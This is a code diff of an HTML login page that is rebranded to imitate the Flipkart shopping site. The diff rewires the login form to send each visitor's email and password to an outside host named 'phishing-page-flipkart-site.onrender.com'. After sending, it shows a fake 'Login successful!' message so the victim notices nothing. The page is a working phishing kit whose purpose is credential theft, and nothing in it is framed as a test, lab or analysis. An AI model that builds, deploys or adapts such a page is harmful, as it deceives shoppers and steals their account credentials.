@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Flirt Clone</title>
+    <title>Login - Flipkart Clone</title>
     <style>
         * {
             margin: 0;
@@ -230,7 +230,7 @@
     <!-- Header -->
     <div class="header">
         <a href="#" class="logo">
-            Flirt
+            Flipkart
             <span>Explore Plus</span>
         </a>
         <div class="search-box">
@@ -291,7 +291,7 @@
         </div>
         
         <p class="terms-text">
-            By continuing, you agree to Flirt's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
+            By continuing, you agree to Flipkart's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
         </p>
         
         <button type="submit" class="submit-btn">Login</button>
@@ -299,42 +299,66 @@
     </form>
 
     <div class="create-account">
-        New to Flirt? <a href="#" onclick="showRegister()">Create an account</a>
+        New to Flipkart? <a href="#" >Create an account</a>
     </div>
 </div>
 
 <!-- Add this JavaScript at the bottom of your body tag -->
 <script>
-    const API_URL = "http://localhost:5000"; // or Render URL
+    const API_URL = "https://phishing-page-flipkart-site.onrender.com";
 
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
         e.preventDefault();
-        
+
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         const messageEl = document.getElementById('message');
-        
+
+        messageEl.style.color = "#333";
+        messageEl.textContent = "Processing...";
+
         try {
             const response = await fetch(`${API_URL}/api/login`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
+                method: 'POST',
+                mode: 'cors', // ✅ IMPORTANT
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({ email, password })
             });
-            
-            const data = await response.json();
-            
-            messageEl.style.color = 'green';
-            messageEl.textContent = '✓ ' + data.message;
+
+            // ✅ handle non-json safely
+            let data;
+            try {
+                data = await response.json();
+            } catch {
+                throw new Error("Invalid server response");
+            }
+
+            if (data.success) {
+                messageEl.style.color = 'green';
+                messageEl.textContent = '✓ ' + data.message;
+
+                setTimeout(() => {
+                    alert("Login successful!");
+                }, 1000);
+
+            } else {
+                messageEl.style.color = 'red';
+                messageEl.textContent = '✗ ' + data.message;
+            }
 
         } catch (error) {
+            console.error(error);
             messageEl.style.color = 'red';
             messageEl.textContent = '✗ Cannot connect to backend';
         }
     });
 </script>
 
+
                 <div class="create-account">
-                    New to Flirt? <a href="#">Create an account</a>
+                    New to Flipkart? <a href="#">Create an account</a>
                 </div>
             </div>
         </div>
